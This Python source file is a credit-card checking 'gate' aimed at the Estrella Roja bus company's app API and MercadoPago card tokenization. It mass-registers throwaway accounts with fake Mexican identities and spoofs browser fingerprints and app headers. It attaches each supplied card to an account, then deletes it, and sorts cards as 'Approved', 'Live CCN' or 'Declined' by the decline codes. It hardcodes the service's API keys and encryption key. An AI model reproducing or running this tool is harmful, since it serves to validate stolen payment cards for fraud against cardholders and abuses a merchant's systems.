# Pure gate motor for 'dns' — no Telegram-bot dependency.

import re, os, json, random, string, types, hashlib, base64, unicodedata

from faker import Faker

from curl_cffi import requests as curl

from Crypto.Cipher import AES

from Crypto.Util.Padding import pad

_GATEWAY = 'MercadoPago Auth'

_SITE_URL = 'https://apicloud.estrellaroja.com.mx'

_AUTH_URL = 'https://apicloud.estrellaroja.com.mx/authenticate/auth'

_MP_KEY = 'APP_USR-ad4fca66-2416-4431-bf86-6da38553103d'

_ENC_KEY = '4212421308'

_CUSTOMER_ID = 803376

_SERVICE_ID = 24

_REG_PASS = 'Estrella0909'

_REG_DOMAIN = 'nullteam.cc'

_API_KEY = '7f79dbba-65f0-44b8-b26d-4618e91a3aa0'

_REG_AUTH = 'Basic N2Y3OWRiYmEtNjVmMC00NGI4LWIyNmQtNDYxOGU5MWEzYWEwOjdmNzlkYmJhLTY1ZjAtNDRiOC1iMjZkLTQ2MThlOTFhM2FhMA=='

_NAMES = ['juan', 'carlos', 'luis', 'jose', 'maria', 'ana', 'pedro', 'miguel', 'david', 'fernando']

_LASTNAMES = ['garcia', 'martinez', 'lopez', 'gonzalez', 'rodriguez', 'fernandez', 'perez', 'gomez', 'sanchez', 'diaz']

_EMAIL_DOMS = ('gmail.com', 'outlook.com', 'hotmail.com')

_LIVE_KEYS = ('insufficient', 'security_code_incorrect', 'cc_rejected_bad_filled', 'call_for_authorize')

_f = Faker('es_MX')

def _ascii(text: str) -> str:
    """Strip accents/diacritics so names are ASCII-safe for MercadoPago
    (avoids 'the first_name is invalid' rejections)."""
    text = unicodedata.normalize('NFD', text)
    return ''.join(c for c in text if unicodedata.category(c) != 'Mn').strip()

def _fake_profile() -> types.SimpleNamespace:
    # Use first_name()/last_name() (avoid titles like 'Sra.', 'Ing.') and take
    # only the first token (Faker es_MX yields compound names like 'José María').
    # Strip accents so cardholder.name is valid for MercadoPago.
    fn = _ascii(_f.first_name()).split()[0]
    ln = _ascii(_f.last_name()).split()[0]
    slug = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=random.randint(4, 7)))
    return types.SimpleNamespace(f_name=fn, l_name=ln, card_name=f'{slug} {fn[:2].upper()}{ln[:2].upper()}', mail=f'{fn.lower()}{random.randint(10, 999)}@{random.choice(_EMAIL_DOMS)}', phone=f'+52{random.randint(5500000000, 5599999999)}', zipcode=f'{random.randint(10000, 99999)}')

def _device_session() -> str:
    return f'armor.{hashlib.md5(os.urandom(16)).hexdigest()}.{hashlib.md5(os.urandom(16)).hexdigest()}'

def _aes_encrypt(plaintext: str) -> str:
    salt = os.urandom(8)
    d = d_i = b''
    while len(d) < 48:
        d_i = hashlib.md5(d_i + _ENC_KEY.encode() + salt).digest()
        d += d_i
    key, iv = (d[:32], d[32:48])
    return base64.b64encode(b'Salted__' + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext.encode(), 16))).decode()

def _register_account(model: curl.Session) -> str:
    prefix = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f'{prefix}{random.randint(100, 999)}@{_REG_DOMAIN}'
    phone = f'+52{random.randint(3000000000, 9999999999)}'
    pass_b64 = base64.b64encode(_REG_PASS.encode()).decode()
    hdrs = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*', 'Authorization': _REG_AUTH, 'Content-Type': 'application/json', 'Origin': 'https://localhost', 'X-Requested-With': 'com.estrellaroja.aeropuerto', 'Referer': 'https://localhost/', 'Accept-Language': 'en-US,en;q=0.9'}
    r1 = model.post(f'{_AUTH_URL}/signup', headers=hdrs, json={'apiKey': _API_KEY, 'age': 18, 'name': random.choice(_NAMES), 'lastname': random.choice(_LASTNAMES), 'motherlastname': random.choice(_LASTNAMES), 'email': email, 'username': email, 'phone': phone, 'zipCode': '', 'gender': '', 'birthday': '2000-01-15T00:00:00.000Z', 'birthDay': '2000-01-15T00:00:00.000Z', 'password': pass_b64, 'confirm_password': pass_b64, 'secret': pass_b64, 'terminos': True, 'canalVenta': 'PLATAFORMA_DIGITAL'}, timeout=15)
    otp = r1.json().get('code') if r1.status_code == 200 else None
    if not otp:
        raise Exception(f'Signup falló ({r1.status_code}): {r1.text[:80]}')
    r2 = model.post(f'{_AUTH_URL}/signup/confirm', headers=hdrs, json={'apiKey': _API_KEY, 'code': otp}, timeout=15)
    if r2.status_code != 200:
        raise Exception(f'OTP confirm falló ({r2.status_code})')
    r3 = model.post(f'{_AUTH_URL}/token/access', headers=hdrs, json={'apiKey': _API_KEY, 'refreshToken': '', 'secret': pass_b64, 'username': email}, timeout=15)
    token = r3.json().get('token', {}).get('access_token') if r3.status_code == 200 else None
    if not token:
        raise Exception(f'Login falló ({r3.status_code}): {r3.text[:80]}')
    return token

def _mp_error(mp_j: dict) -> str:
    """Extract a readable decline message from a MercadoPago error payload.
    Beware that the raw body may be a JSON string like '{"cause":[...]}'."""
    if isinstance(mp_j, str):
        try:
            mp_j = json.loads(mp_j)
        except Exception:
            return mp_j[:200]
    if not isinstance(mp_j, dict):
        return str(mp_j)[:200]

    # Structured cause list (MercadoPago): {"cause":[{"code":...,"description":...}]}
    causes = mp_j.get('cause')
    if isinstance(causes, list) and causes:
        c = causes[0]
        if isinstance(c, dict):
            code = c.get('code', '')
            desc = c.get('description') or c.get('detail') or ''
            if code and desc:
                return f'Error {code}: {desc}'
            return desc or str(code)
        return str(c)

    for key in ('message', 'error', 'description', 'detail', 'Error', 'reason', 'title'):
        val = mp_j.get(key)
        if val:
            return str(val)

    # Fall back to message / error / cause from top-level.
    if mp_j.get('message'):
        return str(mp_j['message'])
    return None


def _flow(num, mes, ano, cvv, retries: int=0) -> dict:
    mes = mes.zfill(2)
    ano = f'20{ano}' if len(ano) == 2 else ano
    card_str = f'{num}|{mes}|{ano}|{cvv}'
    try:
        data = _fake_profile()
        sid = _device_session()
        model = curl.Session(impersonate='chrome131')
        jwt = _register_account(model)
        headers1 = {'Host': 'api.mercadopago.com', 'Accept': '*/*', 'Content-Type': 'application/json', 'X-Product-Id': 'C6N36C9L2KK4U8V6P7J0', 'Origin': 'https://secure-fields.mercadopago.com', 'X-Requested-With': 'com.estrellaroja.aeropuerto', 'Referer': 'https://secure-fields.mercadopago.com/'}
        payload1 = {'card_number': num, 'cardholder': {'name': data.card_name, 'identification': {}}, 'security_code': cvv, 'expiration_month': mes, 'expiration_year': ano, 'device': {'meli': {'session_id': sid}}}
        request1 = model.post(f'https://api.mercadopago.com/v1/card_tokens?public_key={_MP_KEY}&locale=es-MX&js_version=2.60.5&referer=https%3A%2F%2Ferbridge-app.web.app', headers=headers1, json=payload1, timeout=15)
        mp_j = request1.json()
        mp_tok = mp_j.get('id')
        if not mp_tok or mp_j.get('status') != 'active':
            cause = _mp_error(mp_j)
            msg = f"MP Token Rejected: {mp_j.get('status', 'unknown')}" + (f' | {cause}' if cause else '')
            return {'status': True, 'success': False, 'message': msg, 'card': card_str}
        plain = json.dumps({'customer': {'customerId': _CUSTOMER_ID, 'email': data.mail, 'name': data.f_name, 'lastName': data.l_name, 'phone': data.phone, 'zipCode': data.zipcode}, 'card': {'name': f'{data.f_name} {data.l_name}', 'number': '', 'securityCode': '', 'token': mp_tok}})
        headers2 = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*', 'Authorization': f'Bearer {jwt}', 'Content-Type': 'application/json', 'Origin': 'https://localhost', 'X-Requested-With': 'com.estrellaroja.aeropuerto', 'Referer': 'https://localhost/'}
        payload2 = [{'card': {'hash': _aes_encrypt(plain), 'salt': _ENC_KEY}, 'pasarela': 'MERCADO-PAGO-EBUS'}]
        request2 = model.post(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards', headers=headers2, json=payload2, timeout=35)
        if request2.status_code not in (200, 201):
            rj = request2.json() if request2.text else {}
            msg = _mp_error(rj) or rj.get('message') or rj.get('error') or rj.get('description') or rj.get('Error') or request2.text[:150]
            return {'status': True, 'success': False, 'message': str(msg), 'card': card_str}
        headers3 = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*', 'Authorization': f'Bearer {jwt}', 'Origin': 'https://localhost', 'X-Requested-With': 'com.estrellaroja.aeropuerto'}
        request3 = model.get(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards?servicioId={_SERVICE_ID}&clientId={_CUSTOMER_ID}', headers=headers3, timeout=15)
        card_token = (request3.json().get('cards', [{}]) or [{}])[-1].get('cardNumberToken') if request3.status_code == 200 else None
        request4 = model.delete(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards/{card_token}', headers=headers3, timeout=15) if card_token else None
        deleted = '🗑️ Deleted' if request4 and request4.status_code in (200, 204) else '⚠️ Delete Failed'
        return {'status': True, 'success': True, 'message': f'Approved ✅ | {deleted}', 'card': card_str}
    except Exception as error:
        if retries < 2:
            return _flow(num, mes, ano, cvv, retries + 1)
        return {'status': False, 'success': False, 'message': str(error)[:200], 'card': card_str}

def _checker(cc, binData):
    try:
        r = _flow(cc[0], cc[1], cc[2], cc[3])
        msg = r.get('message', '')
        if r.get('success'):
            return {'status': True, 'success': True, 'response': f'Approved ✅ | {msg}'}
        if any((k in msg.lower() for k in _LIVE_KEYS)):
            return {'status': True, 'success': True, 'response': f'Live CCN ✅ | {msg[:120]}'}
        if not r.get('status'):
            return {'status': False, 'raise': msg[:200]}
        return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg[:120]}'}
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}